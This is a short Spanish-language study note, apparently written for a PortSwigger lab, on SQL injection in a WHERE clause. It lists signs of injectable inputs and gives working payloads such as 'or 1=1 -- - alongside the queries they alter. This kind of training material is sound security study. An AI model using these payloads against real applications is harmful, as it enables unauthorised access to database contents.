# SQLi cláusula WHERE

Tags: #SQLi #PortSwigger #MySQL #BurpSuite 

## ¿Dónde detectar posibles puntos SQLi?

```bash 
Puntos clave:

1. Campos de entrada de usuario:
    - Formularios de login, búsqueda, registro, contacto, etc.
    - Parámetros en URLs (`GET`) y formularios (`POST`).
        
2. Interacción con bases de datos:
    - Si un campo termina consultando directamente una base de datos (sin sanitizar), puede ser vulnerable.
        
3. Errores visibles o comportamientos anómalos:
    - Mensajes como: `syntax error`, `unexpected token`, `MySQL error`, etc.
    - Cambios en el comportamiento: por ejemplo, al inyectar `' OR '1'='1` el login se salta.

4. Respuestas condicionales:
    - Si el contenido cambia con payloads como `' AND 1=1--` vs `' AND 1=2--`.
        
5. Uso de operadores comunes:
    - `'`, `"`, `--`, `/*`, `OR`, `AND`, `UNION`, `SELECT`, etc.
```

## Consola 

```mysql
❯ select * from table where column = ' input ' and released = 1;    # Query original 
```

```mysql 
# Colocar la siguiente inyección usando ('or category='Gifts) haciendo que se cierren las comillas originales
❯ select * from table where column = ' input 'or category='Gifts ' and released = 1;   # Inyección en consola 

# Colocar un comentario
❯ select * from table where column = ' input 'or category='Gifts'; -- - ' and released = 1;
❯ select * from table where column = ' input 'or category='Gifts'; # ' and released = 1;

❯ select * from table where column = ' input 'or 1=1; -- - ' and released = 1;
```

## Web 

```
❯ input 'or category='Gifts           # Inyección en la página web 
❯ input 'or category='Gift ' -- -     # Inyección usando un comentario  
❯ input 'or category='Gift ' and released = 1 -- -
❯ input 'or 1=1 -- -

Notas:
	1. Recordar que existen ' input ' imaginarias al momento de ingresar algo en la web
```